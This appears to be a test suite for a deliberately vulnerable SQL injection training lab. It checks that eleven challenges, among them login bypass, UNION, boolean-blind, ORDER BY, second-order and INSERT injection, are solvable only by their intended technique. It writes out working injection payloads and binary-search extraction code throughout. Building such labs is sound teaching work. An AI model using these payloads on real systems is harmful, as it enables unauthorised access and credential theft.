'use strict';
// SQL Injection module: every challenge must be solvable by the documented
// technique and must NOT be solvable by the obvious shortcut. Tests share one
// booted server, so each test uses a fresh client (own cookie jar/session)
// and distinct usernames where the exploit writes rows.
const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const crypto = require('node:crypto');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

const MOD = 'sqli';

// The admin user's random per-deployment secret: the exfiltration target for
// several labs in this module. Read directly from the throwaway test DB only
// to assert that an oracle-driven extraction landed on the right value.
function adminSecretFromDb(dataDir) {
  const Database = require('better-sqlite3');
  const db = new Database(path.join(dataDir, 'vulnlab.db'), { readonly: true });
  const row = db.prepare("SELECT secret FROM users WHERE username = 'admin'").get();
  db.close();
  return row.secret;
}

// P0-8: each rebound challenge (blind, like-wildcard, groupby-having,
// order-by, limit-offset) has its own derived target, computed from the
// admin secret exactly the way modules/sqli/shared.js derives it. Tests read
// it from the throwaway DB only, to assert oracle extractions land on the
// right per-challenge value and that replays fail.
function derivedTargetFromDb(dataDir, challengeId) {
  const admin = adminSecretFromDb(dataDir);
  const hex = crypto.createHash('sha256')
    .update(`${admin}|sqli-target:${challengeId}`, 'utf8')
    .digest('hex')
    .slice(0, 32);
  return `PENTRIX{${hex}}`;
}

function assertNoFlag(text, label) {
  assert.equal((text.match(FLAG_RE) || []).length, 0, `flag leaked on ${label}`);
}

// Every control on the page must carry a clay-* class (hidden inputs and the
// copy buttons of payload blocks are the only exceptions).
function assertStyled(html, label) {
  assert.ok(!html.includes('\u2014'), `em dash on ${label}`);
  assert.ok(!/\sstyle=/.test(html), `inline style on ${label}`);
  assert.ok(!/<style[\s>]/.test(html), `style block on ${label}`);
  assert.ok(!/<table(?![^>]*class=)/.test(html), `bare table on ${label}`);
  for (const m of html.matchAll(/<input\b[^>]*>/g)) {
    assert.ok(/type="hidden"/.test(m[0]) || /class="[^"]*clay-input/.test(m[0]), `unstyled ${m[0]} on ${label}`);
  }
  for (const m of html.matchAll(/<select\b[^>]*>/g)) assert.ok(/class="[^"]*clay-select/.test(m[0]), `unstyled ${m[0]} on ${label}`);
  for (const m of html.matchAll(/<textarea\b[^>]*>/g)) assert.ok(/class="[^"]*clay-input/.test(m[0]), `unstyled ${m[0]} on ${label}`);
  for (const m of html.matchAll(/<button\b[^>]*>/g)) {
    assert.ok(/class="[^"]*(clay-btn|copy-btn)/.test(m[0]), `unstyled ${m[0]} on ${label}`);
  }
}

// Internal hrefs and form actions found on a page.
function internalTargets(html) {
  const links = new Set();
  for (const m of html.matchAll(/\bhref="(\/[^"]*)"/g)) {
    const href = m[1].replace(/&amp;/g, '&').split('#')[0];
    if (href && !href.startsWith('//')) links.add(href);
  }
  const forms = [];
  for (const m of html.matchAll(/<form\b[^>]*>/g)) {
    const action = (m[0].match(/action="([^"]*)"/) || [])[1];
    const method = ((m[0].match(/method="([^"]*)"/) || [])[1] || 'GET').toUpperCase();
    if (action) forms.push({ action, method });
  }
  return { links: [...links], forms };
}

async function assertTargetsResolve(base, html, label) {
  const probe = client(base);
  const { links, forms } = internalTargets(html);
  for (const href of links) {
    const r = await probe.get(href);
    assert.notEqual(r.status, 404, `${label}: dead link ${href}`);
  }
  for (const f of forms) {
    const r = f.method === 'POST' ? await probe.post(f.action, {}) : await probe.get(f.action);
    assert.notEqual(r.status, 404, `${label}: dead form action ${f.method} ${f.action}`);
  }
}

const HEX = '0123456789abcdef';

// Binary-searches one character of the admin secret through a boolean oracle.
// `probeAt(pos, ch)` must resolve true when secret[pos] <= ch.
async function binaryChar(probeAt, pos) {
  let lo = 0, hi = HEX.length - 1;
  while (lo < hi) {
    const mid = (lo + hi) >> 1;
    const isTrue = await probeAt(pos, HEX[mid]);
    if (isTrue) hi = mid; else lo = mid + 1;
  }
  return HEX[lo];
}

// Extracts the 32 hex characters of PENTRIX{<hex>} via a boolean oracle.
// Positions 1-8 are the fixed literal "PENTRIX{", so only 9..40 vary.
async function extractSecretHex(probeAt) {
  let hex = '';
  for (let i = 0; i < 32; i++) hex += await binaryChar(probeAt, 9 + i);
  return `PENTRIX{${hex}}`;
}

test('sqli module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, MOD, id);
  const sqliCaptured = async (c) => (await capturedSet(c)).filter((s) => s.startsWith('sqli:'));

  await t.test('module index renders, 11 challenges, every challenge reachable, no em dash, no flag', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/sqli');
    assert.equal(status, 200);
    assertStyled(text, '/sqli');
    assertNoFlag(text, '/sqli');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 11);
    for (const id of ['login-bypass', 'union', 'blind', 'error', 'order-by', 'second-order', 'like-wildcard', 'limit-offset', 'groupby-having', 'union-filter-bypass', 'insert-inject']) {
      assert.ok(text.includes(`id="${id}"`), `card ${id}`);
    }
    assert.equal((text.match(/Hint \d: (Nudge|Technique|Explicit)/g) || []).length, 33, 'every challenge needs a 3-step hint ladder');
    await assertTargetsResolve(srv.base, text, '/sqli');
  });

  await t.test('login-bypass: wrong password and the real admin password earn nothing, the classic bypass earns the flag', async () => {
    const c = client(srv.base);
    const formPage = await c.get('/sqli/login');
    assert.equal(formPage.status, 200);
    assertStyled(formPage.text, '/sqli/login form');

    const wrong = await c.post('/sqli/login', { username: 'alice', password: 'nope' });
    assertNoFlag(wrong.text, '/sqli/login wrong creds');
    assert.deepEqual(await sqliCaptured(c), []);

    // Fake shortcut: the real seeded admin credentials, no injection involved.
    // They must still LOG IN (advertised demo credentials always work, P1-8),
    // just without earning the flag.
    const realCreds = await c.post('/sqli/login', { username: 'admin', password: 'admin123' });
    assertNoFlag(realCreds.text, '/sqli/login real admin creds');
    assert.ok(realCreds.text.includes('Signed in'), 'the real admin credentials must log in');
    assert.ok(!realCreds.text.includes('Invalid username or password'), 'a correct credential login must not read Invalid');
    assert.deepEqual(await sqliCaptured(c), []);

    const bypass = await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'anything' });
    assert.equal(bypass.status, 200);
    assert.ok(bypass.text.includes(flagOf('login-bypass')));
    assertStyled(bypass.text, '/sqli/login bypass result');
    assert.ok((await sqliCaptured(c)).includes('sqli:Login Bypass'));

    await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'anything' });
    assert.equal((await sqliCaptured(c)).filter((s) => s === 'sqli:Login Bypass').length, 1, 'repeat must not double count');
  });

  await t.test('union: a benign search earns nothing, UNION SELECT against users earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.get('/sqli/products?q=hoodie');
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/products benign');
    assertNoFlag(benign.text, '/sqli/products benign');
    assert.deepEqual(await sqliCaptured(c), []);

    const hit = await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT id,username,password,secret FROM users-- ")}`);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('union')));
    assertStyled(hit.text, '/sqli/products union result');
    assert.ok((await sqliCaptured(c)).includes('sqli:UNION-based Injection'));
  });

  await t.test('blind: a wrong guess earns nothing, the oracle-extracted challenge secret earns the flag', async () => {
    const c = client(srv.base);
    const formPage = await c.get('/sqli/product?id=1');
    assert.equal(formPage.status, 200);
    assertStyled(formPage.text, '/sqli/product form');

    const wrong = await c.post('/sqli/blind-submit', { secret: 'not-the-secret' });
    assertNoFlag(wrong.text, '/sqli/blind-submit wrong guess');
    assert.deepEqual(await sqliCaptured(c), []);

    // P0-8: this challenge's own derived target, exposed to injected SQL as
    // sqli_target(); the oracle interrogates it character by character.
    const probeAt = async (pos, ch) => {
      const id = `0' OR substr(sqli_target(),${pos},1) <= '${ch}' -- `;
      const r = await c.get(`/sqli/product?id=${encodeURIComponent(id)}`);
      return r.text.includes('Product exists.');
    };
    const extracted = await extractSecretHex(probeAt);
    assert.equal(extracted, derivedTargetFromDb(dataDir, 'blind'), 'boolean-oracle extraction must match the derived blind target');

    const hit = await c.post('/sqli/blind-submit', { secret: extracted });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('blind')));
    assertStyled(hit.text, '/sqli/blind-submit result');
    assert.ok((await sqliCaptured(c)).includes('sqli:Boolean Blind Injection'));
  });

  await t.test('error: a plain numeric id earns nothing, a stray quote triggers the error oracle and earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.get('/sqli/detail?id=1');
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/detail benign');
    assertNoFlag(benign.text, '/sqli/detail benign');
    assert.deepEqual(await sqliCaptured(c), []);

    const hit = await c.get(`/sqli/detail?id=${encodeURIComponent("1'")}`);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('error')));
    assertStyled(hit.text, '/sqli/detail error result');
    assert.ok((await sqliCaptured(c)).includes('sqli:Error-based Injection'));
  });

  await t.test('order-by: a plain sort column and the old pattern award earn nothing, the CASE WHEN oracle extracts the challenge secret', async () => {
    const c = client(srv.base);
    const benign = await c.get(`/sqli/sort?sort=${encodeURIComponent('price DESC')}`);
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/sort benign');
    assertNoFlag(benign.text, '/sqli/sort benign');
    assert.deepEqual(await sqliCaptured(c), []);

    // P0-8 regression guard: the pre-fix award fired on this exact pattern
    // (CASE WHEN keywords plus a users reference) with zero extraction.
    const pattern = await c.get(`/sqli/sort?sort=${encodeURIComponent("CASE WHEN (SELECT substr(secret,1,1) FROM users WHERE username='admin')='P' THEN name ELSE price END -- ")}`);
    assert.equal(pattern.status, 200);
    assertNoFlag(pattern.text, '/sqli/sort pattern-only payload');
    assert.deepEqual(await sqliCaptured(c), []);

    // Genuine solve: the row order is the oracle. Probe the derived target
    // (exposed to injected SQL as sqli_target()) one character at a time.
    // The true branch orders by id (first row: the hoodie), the false branch
    // by name (first row: the archived prototype), so the two answers are
    // always distinguishable.
    const firstRowName = async (expr) => {
      const r = await c.get(`/sqli/sort?sort=${encodeURIComponent(expr)}`);
      const m = r.text.match(/<tbody>\s*<tr><td>\d+<\/td><td>\d+<\/td><td>([^<]*)<\/td>/);
      assert.ok(m, 'sorted table must render a first row');
      return m[1];
    };
    const idOrderFirst = await firstRowName('CASE WHEN 1=1 THEN id ELSE name END');
    const probeAt = async (pos, ch) => {
      const expr = `CASE WHEN substr(sqli_target(),${pos},1) <= '${ch}' THEN id ELSE name END`;
      return (await firstRowName(expr)) === idOrderFirst;
    };
    const extracted = await extractSecretHex(probeAt);
    assert.equal(extracted, derivedTargetFromDb(dataDir, 'order-by'), 'CASE WHEN oracle extraction must match the derived order-by target');

    const hit = await c.post('/sqli/sort/submit', { secret: extracted });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('order-by')));
    assertStyled(hit.text, '/sqli/sort/submit result');
    assert.ok((await sqliCaptured(c)).includes('sqli:ORDER BY Injection'));
  });

  await t.test('second-order: a normal display name earns nothing, a stored quote-breakout lands on admin and earns the flag', async () => {
    const c = client(srv.base);
    const regPage = await c.get('/sqli/register');
    assert.equal(regPage.status, 200);
    assertStyled(regPage.text, '/sqli/register form');

    await c.post('/sqli/register', { username: 'demo-normal', display_name: 'Demo Normal', password: 'demo12345' });
    const normalProfile = await c.get('/sqli/profile?u=demo-normal');
    assertNoFlag(normalProfile.text, '/sqli/profile normal');
    assertStyled(normalProfile.text, '/sqli/profile normal');
    assert.deepEqual(await sqliCaptured(c), []);

    await c.post('/sqli/register', { username: 'evil-second-order', display_name: "admin'-- ", password: 'evil12345' });
    const hit = await c.get('/sqli/profile?u=evil-second-order');
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('second-order')));
    assertStyled(hit.text, '/sqli/profile stored-injection result');
    assert.ok((await sqliCaptured(c)).includes('sqli:Second-Order SQL Injection'));
  });

  await t.test('like-wildcard: a wrong guess earns nothing, the LIKE oracle-extracted challenge secret earns the flag', async () => {
    const c = client(srv.base);
    const baseline = await c.get('/sqli/wildcard?q=');
    assert.equal(baseline.status, 200);
    assertStyled(baseline.text, '/sqli/wildcard baseline');
    const total = Number((baseline.text.match(/<b>(\d+)<\/b> of (\d+) products match/) || [])[2]);
    assert.ok(total > 0, 'catalog must have products to match against');

    const wrong = await c.post('/sqli/wildcard/submit', { secret: 'nope' });
    assertNoFlag(wrong.text, '/sqli/wildcard/submit wrong guess');
    assert.deepEqual(await sqliCaptured(c), []);

    // P0-8: interrogate this challenge's own derived target via sqli_target().
    const probeAt = async (pos, ch) => {
      const q = `' AND substr(sqli_target(),${pos},1) <= '${ch}' -- `;
      const r = await c.get(`/sqli/wildcard?q=${encodeURIComponent(q)}`);
      const m = r.text.match(/<b>(\d+)<\/b> of (\d+) products match/);
      return !!m && Number(m[1]) === total;
    };
    const extracted = await extractSecretHex(probeAt);
    assert.equal(extracted, derivedTargetFromDb(dataDir, 'like-wildcard'), 'LIKE-oracle extraction must match the derived like-wildcard target');

    const hit = await c.post('/sqli/wildcard/submit', { secret: extracted });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('like-wildcard')));
    assertStyled(hit.text, '/sqli/wildcard/submit result');
    assert.ok((await sqliCaptured(c)).includes('sqli:LIKE Wildcard Exfiltration'));
  });

  await t.test('limit-offset: a plain numeric limit earns nothing, LIMIT syntax injection pulls the hidden target row into view', async () => {
    const c = client(srv.base);
    const benign = await c.get('/sqli/paged?limit=2');
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/paged benign');
    assertNoFlag(benign.text, '/sqli/paged benign');
    assert.deepEqual(await sqliCaptured(c), []);

    // P0-8: a plain numeric limit, even one that reveals the hidden row,
    // earns nothing; only LIMIT-syntax injection extracts the target.
    // (The revealed target is itself flag-shaped text, so assert the
    // challenge flag value is absent rather than counting flag shapes.)
    const numeric = await c.get('/sqli/paged?limit=100');
    assert.equal(numeric.status, 200);
    assert.ok(!numeric.text.includes(flagOf('limit-offset')), 'numeric limit must not award limit-offset');
    assert.deepEqual(await sqliCaptured(c), []);

    const hit = await c.get('/sqli/paged?limit=-1');
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(derivedTargetFromDb(dataDir, 'limit-offset')), 'hidden target row must be pulled into view');
    assert.ok(hit.text.includes(flagOf('limit-offset')));
    assertStyled(hit.text, '/sqli/paged limit-syntax result');
    assert.ok((await sqliCaptured(c)).includes('sqli:LIMIT/OFFSET Injection'));
  });

  await t.test('groupby-having: a plain grouping column and a quoted literal earn nothing, grouping by sqli_target() leaks the challenge secret', async () => {
    const c = client(srv.base);
    const benign = await c.get('/sqli/stats?by=region');
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/stats benign');
    assertNoFlag(benign.text, '/sqli/stats benign');
    assert.deepEqual(await sqliCaptured(c), []);

    // P0-8 regression guard: the pre-fix award fired for a quoted literal of
    // the (UNION-extracted) admin secret. A literal can never match this
    // challenge's derived target. (assertNoFlag is unusable here: the page
    // echoes the submitted expression, and the admin secret is itself
    // flag-shaped, so assert the challenge flag value is absent instead.)
    const literal = await c.get(`/sqli/stats?by=${encodeURIComponent(`(SELECT '${adminSecretFromDb(dataDir)}')`)}`);
    assert.equal(literal.status, 200);
    assert.ok(!literal.text.includes(flagOf('groupby-having')), 'quoted literal of the admin secret must not award groupby-having');
    assert.deepEqual(await sqliCaptured(c), []);

    const hit = await c.get(`/sqli/stats?by=${encodeURIComponent('(SELECT sqli_target())')}`);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('groupby-having')));
    assertStyled(hit.text, '/sqli/stats group-by result');
    assert.ok((await sqliCaptured(c)).includes('sqli:GROUP BY Injection'));
  });

  await t.test('union-filter-bypass: a benign search and the blocked lowercase keyword earn nothing, mixed case bypasses the filter', async () => {
    const c = client(srv.base);
    const benign = await c.get('/sqli/shop?q=hoodie');
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/shop benign');
    assertNoFlag(benign.text, '/sqli/shop benign');
    assert.deepEqual(await sqliCaptured(c), []);

    const blocked = await c.get(`/sqli/shop?q=${encodeURIComponent("' union SELECT id,username,password,secret FROM users-- ")}`);
    assertNoFlag(blocked.text, '/sqli/shop blocked lowercase keyword');
    assert.deepEqual(await sqliCaptured(c), []);

    const hit = await c.get(`/sqli/shop?q=${encodeURIComponent("' UnIoN SELECT id,username,password,secret FROM users-- ")}`);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('union-filter-bypass')));
    assertStyled(hit.text, '/sqli/shop bypass result');
    assert.ok((await sqliCaptured(c)).includes('sqli:UNION Filter Bypass'));
  });

  await t.test('insert-inject: normal feedback earns nothing, a VALUES subquery writes the secret and earns the flag', async () => {
    const c = client(srv.base);
    await c.post('/sqli/feedback', { name: 'Regular User', message: 'Great shop, fast delivery.' });
    const afterBenign = await c.get('/sqli/feedback');
    assert.equal(afterBenign.status, 200);
    assertStyled(afterBenign.text, '/sqli/feedback benign');
    assertNoFlag(afterBenign.text, '/sqli/feedback benign');
    assert.deepEqual(await sqliCaptured(c), []);

    await c.post('/sqli/feedback', { name: "x', (SELECT secret FROM users WHERE username='admin')) -- ", message: 'hello' });
    const hit = await c.get('/sqli/feedback');
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('insert-inject')));
    assertStyled(hit.text, '/sqli/feedback subquery result');
    assert.ok((await sqliCaptured(c)).includes('sqli:INSERT Injection'));
  });

  await t.test('scoreboard counts every sqli challenge exactly once, even after repeating the exploits', async () => {
    const c = client(srv.base);
    await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'x' });
    await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT id,username,password,secret FROM users-- ")}`);
    await c.get(`/sqli/detail?id=${encodeURIComponent("1'")}`);
    await c.get('/sqli/paged?limit=-1');
    await c.get(`/sqli/stats?by=${encodeURIComponent('(SELECT sqli_target())')}`);
    await c.get(`/sqli/shop?q=${encodeURIComponent("' UnIoN SELECT id,username,password,secret FROM users-- ")}`);
    const got = (await sqliCaptured(c)).length;
    assert.equal(got, 6);

    await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'x' });
    await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT id,username,password,secret FROM users-- ")}`);
    assert.equal((await sqliCaptured(c)).length, 6, 'repeating the exploits must not double count');
  });

  // P0-8 / P0-10 adversarial: one genuine extraction (the admin secret via
  // UNION) must NOT unlock the other challenges. Every replay below uses
  // adversarial input (the real secret, another challenge's real target, a
  // quoted literal), never benign placeholders.
  await t.test('FLAG BAR: secrets extracted via one technique cannot be replayed into another challenge', async () => {
    const c = client(srv.base);
    const unionHit = await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT id,username,password,secret FROM users-- ")}`);
    assert.ok(unionHit.text.includes(flagOf('union')), 'setup: the UNION exploit itself must work');
    const onlyUnion = ['sqli:UNION-based Injection'];
    assert.deepEqual(await sqliCaptured(c), onlyUnion);

    const admin = adminSecretFromDb(dataDir);

    // The UNION-extracted admin secret replayed into the blind submit box.
    const blindReplay = await c.post('/sqli/blind-submit', { secret: admin });
    assertNoFlag(blindReplay.text, 'admin secret replayed into blind-submit');
    assert.deepEqual(await sqliCaptured(c), onlyUnion);

    // The UNION-extracted admin secret replayed into the LIKE submit box.
    const likeReplay = await c.post('/sqli/wildcard/submit', { secret: admin });
    assertNoFlag(likeReplay.text, 'admin secret replayed into wildcard-submit');
    assert.deepEqual(await sqliCaptured(c), onlyUnion);

    // The UNION-extracted admin secret replayed into the ORDER BY submit box.
    const sortReplay = await c.post('/sqli/sort/submit', { secret: admin });
    assertNoFlag(sortReplay.text, 'admin secret replayed into sort-submit');
    assert.deepEqual(await sqliCaptured(c), onlyUnion);

    // A quoted literal of the admin secret as the GROUP BY expression.
    // (The page echoes the submitted expression and the admin secret is
    // flag-shaped, so assert the challenge flag value is absent rather than
    // counting flag-shaped matches.)
    const literal = await c.get(`/sqli/stats?by=${encodeURIComponent(`(SELECT '${admin}')`)}`);
    assert.ok(!literal.text.includes(flagOf('groupby-having')), 'quoted literal of the admin secret in groupby-having');
    assert.deepEqual(await sqliCaptured(c), onlyUnion);

    // The flag-shaped function name smuggled in a string literal must not
    // count as an invocation either.
    const smuggled = await c.get(`/sqli/stats?by=${encodeURIComponent("(SELECT 'sqli_target()')")}`);
    assertNoFlag(smuggled.text, 'sqli_target name smuggled inside a literal in groupby-having');
    assert.deepEqual(await sqliCaptured(c), onlyUnion);

    // One challenge's real derived target replayed into another's submit box.
    const blindTarget = derivedTargetFromDb(dataDir, 'blind');
    const crossBox = await c.post('/sqli/wildcard/submit', { secret: blindTarget });
    assertNoFlag(crossBox.text, 'blind target replayed into wildcard-submit');
    assert.deepEqual(await sqliCaptured(c), onlyUnion);
    const crossBox2 = await c.post('/sqli/sort/submit', { secret: blindTarget });
    assertNoFlag(crossBox2.text, 'blind target replayed into sort-submit');
    assert.deepEqual(await sqliCaptured(c), onlyUnion);

    // sqli_target() evaluated outside its own challenge yields NULL: the
    // UNION challenge cannot mint another challenge's target. (The page
    // renders the catalog rows, including the hidden limit-offset row whose
    // description is flag-shaped, so assert on the wanted flag value rather
    // than counting flag-shaped matches.)
    const foreign = await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT 1,sqli_target(),1,1-- ")}`);
    assert.ok(!foreign.text.includes(flagOf('blind')), 'sqli_target() via the UNION challenge must not reveal the blind flag');
    assert.deepEqual(await sqliCaptured(c), onlyUnion);
  });
});
